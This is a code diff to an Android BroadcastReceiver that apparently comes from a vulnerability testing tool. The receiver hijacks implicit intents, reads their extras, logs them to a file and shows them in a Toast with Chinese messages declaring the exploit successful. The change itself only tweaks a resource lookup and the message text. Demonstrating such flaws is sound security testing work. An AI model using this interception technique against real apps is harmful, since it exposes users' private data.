@@ -17,7 +17,7 @@ public class HijackingImplicitIntentReceiver extends BroadcastReceiver {
 
         FileUtil.saveResultToFile("成功劫持隐式intent。", context);
         category_id = "implicit_intent_4";
-        String name = "R.array." + category_id + "_extras";
+        String name = category_id + "_extras";
         String[] extras = ResourceUtil.getStringArrayByName(context, name);
         FileUtil.saveResultToFile("开始解析intent中的数据........", context);
         if (extras == null) {
@@ -28,12 +28,13 @@ public class HijackingImplicitIntentReceiver extends BroadcastReceiver {
         } else {
             FileUtil.saveResultToFile("intent数据解析如下：", context);
             Bundle bundle = intent.getExtras();
-            String info = "";
+            String info = "成功劫持隐式intent。\n intent数据解析如下：\n";
             for (String extra_key : extras) {
                 String value = bundle.getString(extra_key);
                 info = info + extra_key + ":   " + value.toString() + "\n";
                 FileUtil.saveResultToFile(extra_key + ":   " + value.toString(), context);
             }
+            info = info + "利用成功";
             FileUtil.saveResultToFile("利用成功。", context);
             Toast.makeText(context, info, Toast.LENGTH_LONG).show();
         }
